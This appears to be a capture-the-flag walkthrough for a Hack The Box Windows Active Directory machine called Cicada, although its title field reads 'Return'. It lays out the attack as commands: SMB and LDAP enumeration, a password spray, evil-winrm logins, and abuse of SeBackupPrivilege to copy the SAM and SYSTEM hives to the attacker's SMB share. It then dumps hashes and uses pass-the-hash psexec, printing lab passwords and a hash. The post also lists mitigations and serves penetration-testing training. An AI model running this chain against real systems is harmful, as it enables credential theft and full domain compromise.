---
title: Return
date: 2025-05-30
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, AD, unauth-user-enumeration, SeBackupPrivilege-privesc] 
image: return.png
media_subpath: /assets/img/posts/2025-05-25-returnHTB/
---

## Introduction

In this walkthrough, I tackled *Cicada*, an easy Windows machine focused on Active Directory enumeration and privilege escalation. I began by enumerating the domain and identifying valid users. Exploring accessible SMB shares revealed plaintext passwords stored in files. I then performed a password spray attack, which granted me access. With user privileges, I identified that `SeBackupPrivilege` was enabled. I exploited this privilege to dump sensitive system files and ultimately gained a full SYSTEM shell.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 53

Version: 

Domain: **cicada.htb**

- **dig any DNS records**
    
    ```bash
    dig any cicada.htb @$IP
    ```
    
    ![image.png](image%202.png)
    
- **Zone Transfer**
    
    ```bash
    dig axfr @$IP cicada.htb
    ```
    
    ![image.png](image%203.png)
    

### Port 139/445

- **smbclient**
    
    ![image.png](image%204.png)
    
- **netexec**
    
    ```bash
    sudo nxc smb $IP -u 'randomuser' -p '' --shares
    ```
    
    ![image.png](image%205.png)
    
    - HR directory
        
        ```bash
        Default password - Cicada$M6Corpb*@Lp#nZp!8
        ```
        

### Port 5985 (WinRM)

## AD Initial Enumeration

### User Enumeration

Unauthenticated

```bash
./kerbrute_linux_amd64 userenum -d <domain> --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 70
```

Nothing found here.

### Port 389/3268

```bash
ldapsearch -H ldap://$IP -x -s base -b '' "(objectClass=*)" "*" +
```

Nothing interesting

```powershell
ldapsearch -x -H ldap://$IP -D '' -w '' -b "DC=<RHOST>,DC=local" 
```

Nothing interesting

## Exploitation

I made a search also with `impacket-lookupsid`

```bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass | grep SidTypeUser | cut -d' ' -f 2 | cut -d'\' -f 2 | tee users
```

![image.png](image%206.png)

Then checked on users:

```bash
sudo nxc smb $IP -u users -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```

![image.png](image%207.png)

I tried getting a shell but didn’t succeed.

```bash
evil-winrm -i $IP -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

Further user enumeration reveal password stored in user description:

```bash
sudo nxc smb $IP -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

![image.png](image%208.png)

Unfortunately this account also cannot be used with evil-winrm.

But enumerating shares I see now we can read `DEV` directory:

```bash
sudo nxc smb $IP -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
```

![image.png](image%209.png)

I found a script inside it where cleartext credentials of `emily.oscars` can be found.

Using these credentials finally I can get shell with evil-winrm.

```bash
evil-winrm -i $IP -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

## Privilege Escalation

Checking for privileges I have I found out that I have `SeBackupPrivilege` and `SeRestorePrivilege`:

![image.png](image%2010.png)

I can just leverage SeBackupPrivilege to copy SAM and SYSTEM registry hives and dump SAM hashes, and if local user login is allowed on the target get a shell as NT Authority\System with Administrator hash and psexec.

```powershell
reg save HKLM\SYSTEM SYSTEM.SAV

reg save HKLM\SAM SAM.SAV
```

Transfer files over our machine:

```bash
sudo impacket-smbserver share -smb2support .
```

```bash
copy SAM.SAV \\10.10.14.12\share\SAM.SAV
copy SYSTEM.SAV \\10.10.14.12\share\SYSTEM.SAV
```

```bash
secretsdump.py -sam SAM.SAV -system SYSTEM.SAV LOCAL
```

![image.png](image%2011.png)

```bash
impacket-psexec Administrator@$IP -hashes :2b87e7c93a3e8a0ea4a581937016f341
```

![image.png](image%2012.png)

## Credentials

```bash
michael.wrightson : Cicada$M6Corpb*@Lp#nZp!8

david.orelious : aRt$Lp#7t*VQ!3

emily.oscars : Q!3@Lp#M6b*7t*Vt
```

## Mitigation

- Limit the use of `SeBackupPrivilege` to trusted administrative accounts only.
- Avoid storing plaintext passwords in file shares; enforce proper credential hygiene.
- Implement account lockout policies to prevent password spray attacks.
- Regularly audit SMB shares for sensitive data exposure.
- Apply least privilege principles and monitor for unusual privilege assignments.
